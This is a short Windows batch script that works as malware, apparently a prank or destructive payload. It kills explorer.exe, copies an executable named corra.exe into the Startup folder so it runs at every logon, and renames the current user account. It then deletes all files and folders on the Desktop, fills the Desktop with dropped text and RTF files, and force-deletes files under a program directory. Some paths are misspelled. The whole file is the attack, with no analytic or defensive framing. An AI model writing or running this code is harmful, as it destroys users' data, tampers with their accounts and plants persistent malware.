@echo off
taskkill /f /im explorer.exe
copy %temp%\corra.exe "C:\ProgamData\Microsoft\Windows\Start Menu\Progams\Startup\corra.exe"
wmic useraccount where name='%username%' set FullName='i like u'
wmic useraccount where name='%username%' rename'i like u'
SET /a cr=0
mkdir "%userprofile%\Documents\Your Files has been saved"
copy "%userprofile%\Desktop\*" "%userprofile%\Documents\Your Files has been saved"

del /f /s /q "%userprofile%\Desktop\*"
for /d %%p in (%userprofile%\Desktop\*) Do rd /Q /S "%%p"

:1
copy %temp%\txt.txt %userprofile%\Desktop\
SET /a cr=%cr%+1
if %cr%==28 copy %temp%\ABRAABRAABRAABRAABRAABRAABRAABRAABRAABRAABRA.rtf "%userprofile%\Desktop\ABRAABRAABRAABRAABRAABRAABRAABRAABRAABRAABRA.rtf"
if not %cr%==30 goto 1

del /f /s /q "C:\Progam Files\Windows Apps\"